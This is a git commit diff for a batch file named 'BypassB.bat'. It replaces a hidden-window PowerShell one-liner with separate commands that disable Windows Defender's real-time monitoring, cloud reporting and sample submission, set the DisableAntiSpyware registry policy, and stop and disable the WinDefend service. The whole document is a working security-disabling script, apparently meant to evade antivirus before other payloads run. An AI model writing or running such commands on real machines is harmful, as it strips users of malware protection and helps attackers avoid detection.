9537b58ffe7c7cff845afdae14dda30c8edaba54
v-0v <108912188+v-0v@users.noreply.github.com>
2024-09-28 00:46:30 +0300

    BypassB.bat

--- BypassB.bat
+++ BypassB.bat
@@ -1,1 +1,8 @@
-powershell -windowstyle hidden -command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -MAPSReporting Disabled; Set-MpPreference -SubmitSamplesConsent 2; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
+@echo off
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
+powershell -Command "Set-MpPreference -MAPSReporting Disabled"
+powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
+powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
+powershell -Command "Stop-Service -Name WinDefend -Force"
+powershell -Command "Set-Service -Name WinDefend -StartupType Disabled"
+echo Windows Defender has been disabled.
